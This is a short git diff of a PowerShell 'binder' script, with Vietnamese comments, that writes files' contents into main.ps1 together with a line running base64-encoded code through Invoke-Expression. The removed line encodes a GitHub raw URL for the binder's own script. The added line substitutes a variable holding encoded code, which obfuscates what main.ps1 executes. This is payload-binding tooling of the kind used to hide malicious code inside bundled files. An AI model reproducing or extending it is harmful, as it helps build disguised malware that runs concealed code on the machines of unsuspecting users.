@@ -19,7 +19,7 @@ foreach ($file in $files) {
     # Thêm nội dung vào main.ps1
     Add-Content -Path "main.ps1" -Value "Filecontent = '$fileContent'"
     Add-Content -Path "main.ps1" -Value "name = '$fileName'"
-    Add-Content -Path "main.ps1" -Value "iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3MxdWlhc2RhZC9iaW5kZXIvbWFpbi9maWxlL21haW4ucHMx')))"
+    Add-Content -Path "main.ps1" -Value "iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$codebinder')))"
 }
 
 # Thêm dòng cuối cùng vào main.ps1
